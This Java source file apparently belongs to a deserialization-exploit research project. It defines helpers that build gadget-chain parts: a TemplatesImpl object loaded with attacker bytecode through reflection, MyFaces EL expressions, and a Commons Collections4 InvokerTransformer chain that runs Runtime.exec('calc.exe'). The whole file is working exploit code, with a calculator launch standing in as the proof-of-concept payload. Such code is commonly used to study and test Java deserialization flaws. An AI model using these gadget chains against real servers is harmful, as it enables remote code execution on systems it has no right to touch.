package com.example.Utils;

import com.example.Evil.TemplateImplCalc;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;

import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class Share {

    public static TemplatesImpl getTemplatesImplObj() throws Exception {
        byte[] code = Encoder.class2Bytes(TemplateImplCalc.class);
        TemplatesImpl obj = new TemplatesImpl();
        ReflectionUtil.setField(obj,"_bytecodes",new byte[][]{code});
        ReflectionUtil.setField(obj,"_name","any");
        ReflectionUtil.setField(obj,"_tfactory",new TransformerFactoryImpl());
        return obj;
    }

    public static ValueExpression getValueExpression() throws Exception {
        FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
        ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);

        ReflectionUtil.setField(fc, "_elContext", elContext);

        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();

        ValueExpression expression = expressionFactory.createValueExpression(elContext, "${true}", Object.class);

        return expression;
    }

    public static ValueExpression getEvilExpression() throws Exception {
        FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
        ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);

        ReflectionUtil.setField(fc, "_elContext", elContext);

        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();

        ValueExpression expression = expressionFactory.createValueExpression(elContext, "${1+1}", Object.class);

        return expression;
    }

    public static Transformer[] getTransformers4() {
        String[] execArgs = new String[] {"calc.exe"};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        return transformers;
    }
}
